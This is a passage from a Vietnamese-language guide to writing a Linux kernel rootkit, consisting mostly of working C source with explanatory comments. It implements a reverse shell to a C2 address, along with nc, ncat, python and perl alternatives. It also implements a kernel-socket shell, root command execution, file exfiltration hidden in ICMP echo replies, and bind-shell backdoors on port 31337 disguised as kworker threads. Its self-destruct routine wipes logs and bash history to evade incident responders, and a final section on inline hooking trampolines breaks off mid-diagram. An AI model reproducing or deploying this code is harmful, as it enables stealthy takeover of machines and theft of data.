    ip[sizeof(ip) - 1] = '\0';

    colon = strchr(ip, ':');
    if (!colon) {
        pr_err("rk: invalid c2 addr format: %s\n", c2_addr);
        return;
    }
    *colon = '\0';
    strncpy(port, colon + 1, sizeof(port) - 1);
    port[sizeof(port) - 1] = '\0';

    /* Build reverse shell command.
     *
     * /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
     *
     * Phan tich:
     *   bash -i              : interactive bash shell
     *   >& /dev/tcp/IP/PORT  : redirect stdout+stderr toi TCP connection
     *   0>&1                 : redirect stdin tu cung connection
     *
     * Ket qua: attacker nhan interactive bash shell qua TCP.
     *
     * Alternative commands (neu bash -i bi block):
     *   - /bin/sh + nc:  sh -i 2>&1 | nc IP PORT
     *   - Python:        python3 -c 'import socket,os,pty...'
     *   - Perl:          perl -e 'use Socket;...'
     *   - ncat --exec:   ncat IP PORT -e /bin/bash
     */
    snprintf(bash_cmd, sizeof(bash_cmd),
             "bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1 &'",
             ip, port);

    /* call_usermodehelper args:
     *   argv[0] = path to executable
     *   argv[1..] = arguments
     *   envp[] = environment variables
     *
     * UMH_WAIT_EXEC: doi exec hoan thanh (khong doi process exit)
     * UMH_WAIT_PROC: doi process exit (blocking)
     * UMH_NO_WAIT:   fire-and-forget (async)
     *
     * Dung UMH_NO_WAIT vi shell chay indefinitely.
     * Neu dung UMH_WAIT_PROC → kernel thread block mai mai. */
    {
        char *argv[] = {
            "/bin/bash",
            "-c",
            bash_cmd,
            NULL
        };
        char *envp[] = {
            "HOME=/tmp",
            "TERM=xterm",
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            "HISTFILE=/dev/null",   /* Khong luu bash history */
            NULL
        };

        int ret = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
        if (ret != 0)
            pr_err("rk: reverse shell spawn failed: %d\n", ret);
        else
            pr_info("rk: reverse shell spawned to %s:%s\n", ip, port);
    }
}

/* ══════════════════════════════════════════════════════════════
 * METHOD B: Kernel socket reverse shell (advanced)
 *
 * Tao TCP connection TRUC TIEP trong kernel space.
 * Khong spawn userspace process → khong visible trong ps.
 *
 * Chay trong kernel thread de khong block current task.
 *
 * Gioi han:
 *   - Kernel khong co /bin/bash → command execution phuc tap
 *   - I/O phai hand-roll (recv command → execute → send output)
 *   - Dung call_usermodehelper cho moi command
 *   - Hoac implement simple command parser trong kernel
 * ══════════════════════════════════════════════════════════════ */

struct shell_config {
    __be32 c2_ip;
    __be16 c2_port;
};

static struct task_struct *shell_thread = NULL;

/* ── Receive data tu kernel socket ──
 *
 * kernel_recvmsg() tuong tu recvmsg() syscall nhung kernel-internal.
 * Dung msghdr + kvec (kernel vector) thay vi iovec.
 */
static int ksock_recv(struct socket *sock, char *buf, int len)
{
    struct msghdr msg = { 0 };
    struct kvec iov = {
        .iov_base = buf,
        .iov_len  = len,
    };

    return kernel_recvmsg(sock, &msg, &iov, 1, len, MSG_DONTWAIT);
}

/* ── Send data qua kernel socket ── */
static int ksock_send(struct socket *sock, const char *buf, int len)
{
    struct msghdr msg = { 0 };
    struct kvec iov = {
        .iov_base = (void *)buf,
        .iov_len  = len,
    };

    return kernel_sendmsg(sock, &msg, &iov, 1, len);
}

/* ── Execute command va capture output ──
 *
 * Dung call_usermodehelper_exec() with pipes.
 * Hoac simple approach: write output vao temp file, read back.
 *
 * Approach day: execute command, redirect output vao /tmp file,
 * doc file tu kernel, gui qua socket, xoa file.
 */
static int rk_exec_and_send(struct socket *sock, const char *cmd)
{
    char *output_path = "/tmp/.rk_cmd_out";
    char full_cmd[1024];
    struct file *f;
    char *read_buf;
    loff_t pos = 0;
    ssize_t bytes;

    /* Execute command, redirect output toi temp file */
    snprintf(full_cmd, sizeof(full_cmd),
             "/bin/sh -c '%s > %s 2>&1'", cmd, output_path);

    {
        char *argv[] = { "/bin/sh", "-c", full_cmd, NULL };
        char *envp[] = {
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            NULL
        };
        /* UMH_WAIT_PROC: doi command hoan thanh de doc output */
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    }

    /* Doc output file */
    f = filp_open(output_path, O_RDONLY, 0);
    if (IS_ERR(f)) {
        ksock_send(sock, "exec failed\n", 12);
        return -1;
    }

    read_buf = kzalloc(4096, GFP_KERNEL);
    if (!read_buf) {
        filp_close(f, NULL);
        return -1;
    }

    while ((bytes = kernel_read(f, read_buf, 4096, &pos)) > 0) {
        ksock_send(sock, read_buf, bytes);
    }

    kfree(read_buf);
    filp_close(f, NULL);

    /* Xoa temp file.
     * Dung vfs_unlink hoac call_usermodehelper("rm"). */
    {
        char *argv[] = { "/bin/rm", "-f", output_path, NULL };
        char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    }

    return 0;
}

/* ── Kernel thread: reverse shell loop ──
 *
 * Thread chay indefinitely:
 *   1. Connect toi C2
 *   2. Recv command
 *   3. Execute
 *   4. Send output
 *   5. Loop
 */
static int reverse_shell_thread_fn(void *data)
{
    struct shell_config *cfg = (struct shell_config *)data;
    struct socket *sock = NULL;
    struct sockaddr_in addr;
    char cmd_buf[1024];
    int ret, cmd_len;

    /* ── Create TCP socket ── */
    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
                            IPPROTO_TCP, &sock);
    if (ret < 0) {
        pr_err("rk: sock_create failed: %d\n", ret);
        goto out;
    }

    /* ── Connect toi C2 server ── */
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = cfg->c2_ip;
    addr.sin_port = cfg->c2_port;

    ret = kernel_connect(sock, (struct sockaddr *)&addr,
                          sizeof(addr), 0);
    if (ret < 0) {
        pr_err("rk: kernel_connect failed: %d\n", ret);
        goto out_release;
    }

    /* Send banner */
    ksock_send(sock, "# rk shell ready\n# ", 19);

    /* ── Command loop ── */
    while (!kthread_should_stop()) {
        /* Recv command */
        memset(cmd_buf, 0, sizeof(cmd_buf));
        cmd_len = ksock_recv(sock, cmd_buf, sizeof(cmd_buf) - 1);

        if (cmd_len <= 0) {
            /* Connection closed hoac error */
            if (cmd_len == -EAGAIN || cmd_len == -EWOULDBLOCK) {
                /* No data available (non-blocking) — sleep va retry */
                msleep(100);
                continue;
            }
            break;  /* Connection lost */
        }

        /* Trim trailing newline */
        while (cmd_len > 0 &&
               (cmd_buf[cmd_len - 1] == '\n' ||
                cmd_buf[cmd_len - 1] == '\r'))
            cmd_buf[--cmd_len] = '\0';

        if (cmd_len == 0) {
            ksock_send(sock, "# ", 2);
            continue;
        }

        /* Special commands */
        if (strcmp(cmd_buf, "exit") == 0 ||
            strcmp(cmd_buf, "quit") == 0)
            break;

        if (strcmp(cmd_buf, "root") == 0) {
            /* Give root toi current hoac specified process */
            ksock_send(sock, "use: kill -54 31337\n# ", 21);
            continue;
        }

        /* Execute va send output */
        rk_exec_and_send(sock, cmd_buf);
        ksock_send(sock, "# ", 2);
    }

out_release:
    if (sock)
        sock_release(sock);
out:
    kfree(cfg);
    shell_thread = NULL;
    return 0;
}

/* ── Public API: spawn reverse shell thread ── */
static void rk_spawn_kernel_reverse_shell(__be32 c2_ip, __be16 c2_port)
{
    struct shell_config *cfg;

    if (shell_thread) {
        pr_info("rk: shell thread already running\n");
        return;
    }

    cfg = kzalloc(sizeof(*cfg), GFP_KERNEL);
    if (!cfg) return;
    cfg->c2_ip = c2_ip;
    cfg->c2_port = c2_port;

    /* kthread_run = kthread_create + wake_up_process.
     *
     * Thread name "kworker/u:0" — disguised as worker thread.
     * Legit kworker names: kworker/0:1, kworker/u8:2, etc.
     * Forensics tip: kworker threads created by rootkit have
     * unusual stack traces → detectable via /proc/PID/stack. */
    shell_thread = kthread_run(reverse_shell_thread_fn, cfg,
                                "kworker/u:0");
    if (IS_ERR(shell_thread)) {
        pr_err("rk: kthread_run failed\n");
        kfree(cfg);
        shell_thread = NULL;
    }
}
```

### 8.3 Command Execution — rk_execute_command

```c
/* command_exec.c — Execute arbitrary commands tu kernel
 *
 * Nhan command string tu magic packet, execute trong userspace.
 * Output KHONG gui nguoc → "fire and forget".
 * Cho execute-and-exfil, dung reverse shell.
 */

#include "rootkit.h"
#include <linux/kmod.h>

static void rk_execute_command(const char *cmd)
{
    char *argv[] = { "/bin/sh", "-c", (char *)cmd, NULL };
    char *envp[] = {
        "HOME=/tmp",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "HISTFILE=/dev/null",
        NULL
    };

    /* UMH_NO_WAIT: async execution — khong block kernel.
     *
     * Internally call_usermodehelper:
     *   1. Allocate subprocess_info struct
     *   2. Queue work tren khelper workqueue
     *   3. Worker thread fork+exec /bin/sh
     *   4. /bin/sh chay command
     *   5. Return code discarded (UMH_NO_WAIT)
     *
     * Process chay voi uid=0, full capabilities.
     * Spawned process CO THE visible trong ps
     * → rootkit tu an no qua getdents64 hook
     *   (neu process name match hidden criteria).
     *
     * OPSEC consideration:
     *   - /bin/sh fork co PPID = 2 (kthreadd) → unusual
     *   - Forensics tools detect nay: orphaned shell with kthreadd parent
     *   - Mitigation: re-parent process (prctl PR_SET_PDEATHSIG workaround)
     */
    int ret = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    if (ret)
        pr_err("rk: command exec failed: %d\n", ret);
}
```

### 8.3.5 File Exfiltration — rk_exfiltrate_file

```c
/* exfiltrate.c — Doc file tu disk va gui qua ICMP echo reply
 *
 * Technique: doc file thanh chunks, gui moi chunk trong
 * ICMP echo reply payload. Receiver (attacker) reassemble.
 *
 * Tai sao ICMP:
 *   - ICMP echo reply it bi block hon outbound TCP
 *   - Payload co the lon (MTU - headers)
 *   - Khong can establish connection
 *   - IDS thuong chi check ICMP rate, khong check payload
 *
 * Gioi han: max exfil ~1400 bytes/packet (MTU 1500 - IP - ICMP headers).
 * File lon duoc chia thanh multiple packets voi sequence number.
 */

#define EXFIL_CHUNK_SIZE 1024
#define EXFIL_MAGIC      0xEF11

struct exfil_header {
    u16 magic;
    u16 seq;
    u16 total;
    u16 data_len;
} __attribute__((packed));

static void rk_exfiltrate_file(const char *filepath, __be32 dest_ip)
{
    struct file *f;
    loff_t pos = 0;
    char *buf;
    ssize_t bytes_read;
    struct exfil_header hdr;
    u16 seq = 0;
    loff_t file_size;
    u16 total_chunks;

    f = filp_open(filepath, O_RDONLY, 0);
    if (IS_ERR(f)) {
        pr_err("rk: exfil open failed: %s\n", filepath);
        return;
    }

    file_size = i_size_read(file_inode(f));
    total_chunks = (file_size + EXFIL_CHUNK_SIZE - 1) / EXFIL_CHUNK_SIZE;
    if (total_chunks == 0) total_chunks = 1;

    buf = kmalloc(EXFIL_CHUNK_SIZE, GFP_KERNEL);
    if (!buf) {
        filp_close(f, NULL);
        return;
    }

    while ((bytes_read = kernel_read(f, buf, EXFIL_CHUNK_SIZE, &pos)) > 0) {
        struct sk_buff *nskb;
        struct iphdr *niph;
        struct icmphdr *nich;
        unsigned int payload_len = sizeof(hdr) + bytes_read;
        unsigned int total_len = sizeof(struct iphdr) +
                                  sizeof(struct icmphdr) + payload_len;

        nskb = alloc_skb(LL_MAX_HEADER + total_len, GFP_KERNEL);
        if (!nskb) break;

        skb_reserve(nskb, LL_MAX_HEADER);
        skb_reset_network_header(nskb);

        /* Build IP header */
        niph = skb_put(nskb, sizeof(struct iphdr));
        niph->version  = 4;
        niph->ihl      = 5;
        niph->tos      = 0;
        niph->tot_len  = htons(total_len);
        niph->id       = htons(seq);
        niph->frag_off = 0;
        niph->ttl      = 64;
        niph->protocol = IPPROTO_ICMP;
        niph->saddr    = 0;  /* kernel fills via routing */
        niph->daddr    = dest_ip;
        niph->check    = 0;
        niph->check    = ip_fast_csum((unsigned char *)niph, niph->ihl);

        /* Build ICMP echo reply header */
        nich = skb_put(nskb, sizeof(struct icmphdr));
        nich->type = ICMP_ECHOREPLY;
        nich->code = 0;
        nich->un.echo.id = htons(EXFIL_MAGIC);
        nich->un.echo.sequence = htons(seq);

        /* Append exfil header + data */
        hdr.magic    = htons(EXFIL_MAGIC);
        hdr.seq      = htons(seq);
        hdr.total    = htons(total_chunks);
        hdr.data_len = htons((u16)bytes_read);
        skb_put_data(nskb, &hdr, sizeof(hdr));
        skb_put_data(nskb, buf, bytes_read);

        /* Fix ICMP checksum */
        nich->checksum = 0;
        nich->checksum = csum_fold(skb_checksum(nskb,
            skb_transport_offset(nskb),
            nskb->len - skb_transport_offset(nskb), 0));

        /* Route and send */
        {
            struct rtable *rt;
            struct flowi4 fl4 = {};
            fl4.daddr = dest_ip;
            fl4.flowi4_proto = IPPROTO_ICMP;

            rt = ip_route_output_key(&init_net, &fl4);
            if (!IS_ERR(rt)) {
                skb_dst_set(nskb, &rt->dst);
                niph->saddr = fl4.saddr;
                ip_local_out(&init_net, NULL, nskb);
            } else {
                kfree_skb(nskb);
            }
        }

        seq++;
        msleep(50);  /* Rate limit: 20 packets/sec */
    }

    kfree(buf);
    filp_close(f, NULL);
    pr_info("rk: exfil complete: %s (%u chunks)\n", filepath, seq);
}
```

### 8.4 Self-Destruct — rk_self_destruct

```c
/* self_destruct.c — Clean removal of rootkit
 *
 * Khi nhan self-destruct command:
 *   1. Remove tat ca hooks
 *   2. Show module (de rmmod hoat dong)
 *   3. Delete rootkit files tu disk
 *   4. Remove persistence mechanisms
 *   5. Unload module
 *
 * APT pattern: tu huy khi phat hien forensics tool,
 * hoac khi mission complete (data exfiltrated).
 *
 * Muc dich: khong de lai traces cho incident response team.
 */

#include "rootkit.h"
#include <linux/kmod.h>

static void rk_self_destruct(void)
{
    pr_info("rk: self-destruct initiated\n");

    /* Step 1: Remove hooks TRUOC khi unload.
     * Neu unload ma hooks van active → crash. */
    rk_remove_hooks();
    rk_vfs_hook_remove();
    rk_net_cleanup();

    /* Step 2: Show module (re-insert vao module list).
     * rmmod can module trong list de find va unload. */
    rk_show_module();

    /* Step 3: Delete rootkit files tu disk.
     *
     * Xoa:
     *   - Module .ko file
     *   - Config files
     *   - Persistence entries
     *   - Temp files
     *
     * Dung call_usermodehelper vi kernel vfs_unlink
     * can dentry resolution → phuc tap hon.
     */
    {
        char *cleanup_script =
            "rm -f /lib/modules/$(uname -r)/extra/rk.ko 2>/dev/null; "
            "rm -f /etc/modules-load.d/rk.conf 2>/dev/null; "
            "rm -f /tmp/.rk_* 2>/dev/null; "
            "rm -f /var/tmp/.rk_* 2>/dev/null; "
            "depmod -a 2>/dev/null; "
            "sed -i '/^rk$/d' /etc/modules 2>/dev/null; "
            /* Remove systemd service neu co */
            "systemctl disable rk.service 2>/dev/null; "
            "rm -f /etc/systemd/system/rk.service 2>/dev/null; "
            /* Remove udev rule neu co */
            "rm -f /etc/udev/rules.d/99-rk.rules 2>/dev/null; "
            /* Xoa command history lien quan */
            "sed -i '/insmod.*rk/d' /root/.bash_history 2>/dev/null; "
            /* Clear dmesg (xoa kernel log cua rootkit) */
            "dmesg -C 2>/dev/null; "
            /* Cuoi cung: rmmod chinh module nay */
            "rmmod rk 2>/dev/null";

        char *argv[] = { "/bin/sh", "-c", cleanup_script, NULL };
        char *envp[] = {
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            NULL
        };

        /* UMH_NO_WAIT vi rmmod se trigger module exit.
         * Neu UMH_WAIT_PROC → deadlock (doi rmmod xong
         * nhung rmmod can chay exit code ma ta dang trong). */
        call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    }
}
```

### 8.5 Backdoor Activation — rk_activate_backdoor

```c
/* backdoor.c — Activate backdoor sau port knock hoac magic packet
 *
 * Bind shell: mo listening port tren target machine.
 * Attacker connect toi port → nhan shell.
 *
 * Khac reverse shell:
 *   Reverse shell: target connect OUT toi C2
 *   Bind shell:    target LISTEN, C2 connect IN
 *
 * Bind shell useful khi:
 *   - Target co outbound firewall (block reverse connections)
 *   - Attacker da co inbound access (same network, VPN)
 *   - Port knock mo bind shell chi khi can
 */

#include "rootkit.h"
#include <linux/kmod.h>
#include <linux/kthread.h>
#include <net/sock.h>
#include <linux/in.h>

#define BACKDOOR_PORT 31337

static struct task_struct *backdoor_thread = NULL;

/* ── Backdoor: userspace bind shell via call_usermodehelper ── */
static void rk_activate_backdoor_simple(__be32 authorized_ip)
{
    /* Spawn ncat/socat bind shell.
     *
     * ncat -lnvp PORT -e /bin/bash:
     *   -l     : listen mode
     *   -n     : no DNS resolution
     *   -v     : verbose
     *   -p PORT: listen port
     *   -e /bin/bash: execute bash on connection
     *
     * Fallback: socat, python, perl neu ncat khong available.
     *
     * Multiple attempts voi khac nhau tools tang success rate.
     */
    char cmd[512];

    snprintf(cmd, sizeof(cmd),
        "which ncat >/dev/null 2>&1 && ncat -lnvp %d -e /bin/bash & "
        "|| which socat >/dev/null 2>&1 && "
        "socat TCP-LISTEN:%d,reuseaddr,fork EXEC:/bin/bash & "
        "|| python3 -c '"
        "import socket,subprocess,os;"
        "s=socket.socket();"
        "s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
        "s.bind((\"0.0.0.0\",%d));"
        "s.listen(1);"
        "c,a=s.accept();"
        "os.dup2(c.fileno(),0);"
        "os.dup2(c.fileno(),1);"
        "os.dup2(c.fileno(),2);"
        "subprocess.call([\"/bin/bash\",\"-i\"]);' &",
        BACKDOOR_PORT, BACKDOOR_PORT, BACKDOOR_PORT);

    rk_execute_command(cmd);

    pr_info("rk: backdoor activated on port %d (authorized from %pI4)\n",
            BACKDOOR_PORT, &authorized_ip);
}

/* ── Backdoor: kernel socket bind shell (no userspace process) ──
 *
 * Advanced: bind TCP socket trong kernel, accept connections,
 * pipe commands qua rk_exec_and_send.
 * Khong tao userspace process cho listener.
 */
static int backdoor_thread_fn(void *data)
{
    struct socket *listen_sock = NULL, *client_sock = NULL;
    struct sockaddr_in addr;
    char cmd_buf[1024];
    int ret, cmd_len;

    /* Create listening socket */
    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
                            IPPROTO_TCP, &listen_sock);
    if (ret < 0) goto out;

    /* Set SO_REUSEADDR — cho phep bind lai port sau close */
    int opt = 1;
    kernel_setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR,
                      (char *)&opt, sizeof(opt));

    /* Bind */
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons(BACKDOOR_PORT);

    ret = kernel_bind(listen_sock, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) goto out_release;

    /* Listen — backlog = 1 (chi 1 connection tai 1 thoi diem) */
    ret = kernel_listen(listen_sock, 1);
    if (ret < 0) goto out_release;

    pr_info("rk: backdoor listening on port %d\n", BACKDOOR_PORT);

    /* Accept loop */
    while (!kthread_should_stop()) {
        /* Accept connection.
         * kernel_accept blocks cho den khi co connection.
         * Tao client_sock moi cho connection. */
        ret = kernel_accept(listen_sock, &client_sock, 0);
        if (ret < 0) {
            if (ret == -EAGAIN) {
                msleep(100);
                continue;
            }
            break;
        }

        ksock_send(client_sock, "# rk backdoor\n# ", 17);

        /* Command loop cho connection nay */
        while (!kthread_should_stop()) {
            memset(cmd_buf, 0, sizeof(cmd_buf));
            cmd_len = ksock_recv(client_sock, cmd_buf,
                                 sizeof(cmd_buf) - 1);

            if (cmd_len <= 0) {
                if (cmd_len == -EAGAIN) {
                    msleep(50);
                    continue;
                }
                break;
            }

            /* Trim newlines */
            while (cmd_len > 0 &&
                   (cmd_buf[cmd_len-1] == '\n' ||
                    cmd_buf[cmd_len-1] == '\r'))
                cmd_buf[--cmd_len] = '\0';

            if (cmd_len == 0) { ksock_send(client_sock, "# ", 2); continue; }
            if (strcmp(cmd_buf, "exit") == 0) break;

            rk_exec_and_send(client_sock, cmd_buf);
            ksock_send(client_sock, "# ", 2);
        }

        sock_release(client_sock);
        client_sock = NULL;
    }

out_release:
    if (listen_sock) sock_release(listen_sock);
out:
    backdoor_thread = NULL;
    return 0;
}

static void rk_activate_backdoor(__be32 authorized_ip)
{
    if (backdoor_thread) return;

    backdoor_thread = kthread_run(backdoor_thread_fn, NULL,
                                   "kworker/events");
    if (IS_ERR(backdoor_thread)) {
        backdoor_thread = NULL;
        /* Fallback toi userspace bind shell */
        rk_activate_backdoor_simple(authorized_ip);
    }
}
```

---

## Chapter 9: Inline Hooking

### 9.0 x86-64 Instruction Encoding — Cach patch code trong memory

Inline hooking la ky thuat THAY DOI TRUC TIEP machine code cua target function. De lam dung, ban PHAI hieu cach CPU decode instructions, va cac van de khi modify code tren he thong multi-CPU (SMP).

#### 9.0.1 x86-64 Instruction Format

Moi instruction x86-64 co format phuc tap voi nhieu thanh phan optional. Day la format tong quat:

```
  x86-64 Instruction Format:
  ═══════════════════════════════════════════════════════════════

  [Legacy Prefix] [REX Prefix] [Opcode] [ModR/M] [SIB] [Displacement] [Immediate]
   0-4 bytes       0-1 byte    1-3 bytes  0-1     0-1    0/1/2/4        0/1/2/4/8

  Legacy Prefixes (optional):
    66  = operand size override (16-bit trong 32/64-bit mode)
    F0  = LOCK prefix (atomic operations)
    F2  = REPNE/REPNZ
    F3  = REP/REPE/REPZ

  REX Prefix (optional, chi trong 64-bit mode):
    Format: 0100 WRXB
    W = 1: 64-bit operand size (48 = REX.W)
    R, X, B: extend ModR/M va SIB register fields

  Opcode: 1-3 bytes, xac dinh instruction type
  ModR/M: register/memory addressing mode
  SIB: Scale-Index-Base (complex addressing)
  Displacement: memory offset (1/2/4 bytes)
  Immediate: constant value (1/2/4/8 bytes)
```

**Hai instructions ma rootkit dung de tao trampoline:**

```
  Instruction 1: MOV RAX, imm64 (10 bytes)
  ═════════════════════════════════════════

  Byte layout:
  ┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐
  │ 48 │ B8 │ xx │ xx │ xx │ xx │ xx │ xx │ xx │ xx │
  └────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘
    │    │    └──────────────────────────────────────┘
    │    │         8-byte immediate value
    │    │         (dia chi cua hook function)
    │    │
    │    └── Opcode: B8+rd = MOV to register
    │        B8 = MOV to RAX (register 0)
    │        B9 = MOV to RCX, BA = MOV to RDX, etc.
    │
    └── REX.W prefix: 0x48 = 0100 1000
        W=1: 64-bit operand size
        (neu khong co REX.W → chi move 32-bit)

  Vi du cu the:
    MOV RAX, 0xFFFF888012345678
    → 48 B8 78 56 34 12 80 88 FF FF
                └── little-endian!


  Instruction 2: JMP RAX (2 bytes)
  ═════════════════════════════════

  Byte layout:
  ┌────┬────┐
  │ FF │ E0 │
  └────┴────┘
    │    │
    │    └── ModR/M byte: E0 = 11 100 000
    │        11  = register direct (khong memory)
    │        100 = /4 = JMP opcode extension
    │        000 = RAX register
    │
    └── Opcode: FF = group opcode (JMP/CALL/PUSH indirect)
        FF /4 = JMP r/m64 (near jump, indirect)


  TRAMPOLINE TONG HOP: 10 + 2 = 12 bytes
  ════════════════════════════════════════

  48 B8 xx xx xx xx xx xx xx xx    MOV RAX, <target_address>
  FF E0                            JMP RAX

  → Unconditional jump toi bat ky dia chi 64-bit nao
  → Day la "absolute indirect jump" pattern
  → Overwrite 12 bytes dau cua target function
```

**Tai sao 12 bytes? Tai sao khong dung JMP rel32?**
```
  JMP rel32 (5 bytes): E9 xx xx xx xx
  ─────────────────────────────────────
  Chi jump duoc +-2GB tu vi tri hien tai.
  Trong kernel 64-bit, khoang cach giua module memory
  va kernel text CO THE > 2GB → JMP rel32 KHONG DU.

  MOV RAX + JMP RAX (12 bytes):
  ─────────────────────────────
  Jump duoc toi BAT KY dia chi nao trong 64-bit address space.
  An toan cho moi truong hop.
  Trade-off: ton 12 bytes thay vi 5, nhung LUON DUNG.
```

#### 9.0.2 Self-Modifying Code tren SMP — Van de va giai phap

Tren he thong multi-core (SMP), modify code trong memory khi CPU khac dang execute code do la CUC KY NGUY HIEM:

```
  Van de: Partial patch visible cho CPU khac
  ═══════════════════════════════════════════

  CPU 0 (patcher):                CPU 1 (dang execute target_func):
  ────────────────                ──────────────────────────────────

  target_func original bytes:
  55 48 89 E5 48 83 EC 20 48 89 7D F8 ...
  [push rbp] [mov rbp,rsp] [sub rsp,0x20] ...

  writes byte 0: 48                CPU 1 fetch instruction at target_func
  writes byte 1: B8                CPU 1 thay: 48 B8 89 E5 48 83 EC 20...
  writes byte 2: xx                ← PARTIAL PATCH!
                                   48 B8 89 E5 48 83 EC 20 = MOV RAX, 0x20EC8348E58948B8
                                   → MOV RAX voi WRONG address
                                   → JMP toi garbage address
                                   → PAGE FAULT hoac execute random code
  ...                              → KERNEL CRASH
  writes byte 11: E0

  WORST CASE: CPU 1 thay nua instruction cu + nua instruction moi
  → CPU decode sai → undefined behavior → crash hoac silent corruption
```

#### 9.0.3 stop_machine() — Giai phap cho SMP-safe patching

```
  stop_machine(do_patch, &patch_data, NULL)
  ═══════════════════════════════════════════

  Buoc 1: Gui IPI (Inter-Processor Interrupt) toi TAT CA CPUs
  ─────────────────────────────────────────────────────────────
  
  CPU 0 (caller)      CPU 1              CPU 2              CPU 3
       │                │                  │                  │
       │   ──── IPI ───→│                  │                  │
       │   ──── IPI ──────────────────────→│                  │
       │   ──── IPI ─────────────────────────────────────────→│
       │                │                  │                  │

  Buoc 2: Moi CPU enter busy-wait loop (STOP executing normal code)
  ──────────────────────────────────────────────────────────────────
  
  CPU 0 (caller)      CPU 1              CPU 2              CPU 3
       │              spin...            spin...            spin...
       │              (khong execute     (khong execute     (khong execute
       │               bat ky code nao    bat ky code nao    bat ky code nao
       │               ngoai spin loop)   ngoai spin loop)   ngoai spin loop)

  Buoc 3: CPU 0 chay do_patch() — CHI MINH NO hoat dong
  ──────────────────────────────────────────────────────
  
  CPU 0:                        CPU 1-3: van spin...
  rk_unprotect_memory();
  memcpy(target, patch, 12);   ← AN TOAN! Khong CPU nao khac
  rk_protect_memory();            dang execute target function
  sync_core();                  ← Flush instruction cache

  Buoc 4: Release tat ca CPUs
  ───────────────────────────
  
  CPU 0 (done)        CPU 1              CPU 2              CPU 3
       │              exit spin          exit spin          exit spin
       │              resume normal      resume normal      resume normal
       │              (thay patched      (thay patched      (thay patched
       │               code)              code)              code)

  GUARANTEE: Trong suot Buoc 3:
  ─────────────────────────────
  - KHONG CPU nao dang o giua viec execute target function
  - KHONG CPU nao co the bat dau execute target function
  - Patch la ATOMIC tu goc nhin cua moi CPU khac
  - Sau khi resume, moi CPU thay COMPLETE patched code
```

**Tham khao source:** `include/linux/stop_machine.h`, `kernel/stop_machine.c`

#### 9.0.4 Alternative: text_poke_bp() — INT3-based patching (dung boi ftrace)

```
  text_poke_bp() (arch/x86/kernel/alternative.c):
  ════════════════════════════════════════════════

  Buoc 1: Ghi INT3 (0xCC, 1 byte) tai byte dau cua target
  ─────────────────────────────────────────────────────────
  
  TRUOC:  55 48 89 E5 48 83 EC 20 ...     [push rbp] [mov rbp,rsp] ...
  SAU:    CC 48 89 E5 48 83 EC 20 ...     [INT3]     [mov rbp,rsp] ...
                                           ↑ single byte write = ATOMIC

  Buoc 2: Sync tat ca CPUs (IPI flush)
  ────────────────────────────────────

  Buoc 3: Ghi remaining bytes (bytes 1-11)
  ────────────────────────────────────────
  
  SAU:    CC B8 xx xx xx xx xx xx xx xx FF E0
          ↑  └── new bytes (nhung byte 0 van la INT3)

  Buoc 4: Replace INT3 voi byte dau cua new code
  ────────────────────────────────────────────────
  
  SAU:    48 B8 xx xx xx xx xx xx xx xx FF E0
          ↑ complete patch!

  Buoc 5: Sync tat ca CPUs

  NEU CPU khac hit INT3 trong buoc 3:
  ────────────────────────────────────
  INT3 handler detect day la text_poke in progress
  → Emulate original instruction (push rbp)
  → Return → CPU tiep tuc tu instruction tiep theo
  → KHONG crash, KHONG undefined behavior!

  So sanh voi stop_machine():
  ──────────────────────────────────────────────────────
  stop_machine():    STOP tat ca CPUs → patch → resume
                     + Dam bao 100% safe
                     - VERY expensive (system-wide stall)
                     - Latency spike cho moi CPU

  text_poke_bp():    INT3 + incremental patch
                     + Nhe hon (chi 1 byte atomic write)
                     + Khong stall he thong
                     - Phu thuoc INT3 handler (complex)
                     - Co the unexported symbol
```

#### 9.0.5 Trampoline — Cach goi original function sau khi patch

```
  TRUOC khi patch:
  ════════════════

  target_func:
    0x1000: 55              push rbp           ─┐
    0x1001: 48 89 E5        mov rbp, rsp        │ 12 bytes se bi
    0x1004: 48 83 EC 20     sub rsp, 0x20       │ overwrite
    0x1008: 48 89 7D F8     mov [rbp-8], rdi   ─┘
    0x100C: ...             (tiep tuc)          ← target_func + 12


  SAU khi patch (hook installed):
  ════════════════════════════════

  target_func (patched):
    0x1000: 48 B8 xx..xx    MOV RAX, hook_fn   ─┐ 12 bytes patch
    0x100A: FF E0           JMP RAX            ─┘ → nhay toi hook_fn
    0x100C: ...             (khong bao gio execute truc tiep)

  hook_fn (rootkit's function):
    → xu ly logic cua rootkit
    → khi can goi ORIGINAL function: call trampoline

  trampoline (executable memory, allocated boi module_alloc):
    0xA000: 55              push rbp           ─┐ copied original
    0xA001: 48 89 E5        mov rbp, rsp        │ 12 bytes
    0xA004: 48 83 EC 20     sub rsp, 0x20       │
    0xA008: 48 89 7D F8     mov [rbp-8], rdi   ─┘
    0xA00C: 48 B8 0C 10...  MOV RAX, 0x100C    ─┐ jump back
    0xA016: FF E0           JMP RAX            ─┘ toi target+12

  Flow khi caller goi target_func:
  ─────────────────────────────────

  caller ──→ target_func ──→ JMP hook_fn
                               │
                               ▼
                          hook_fn:
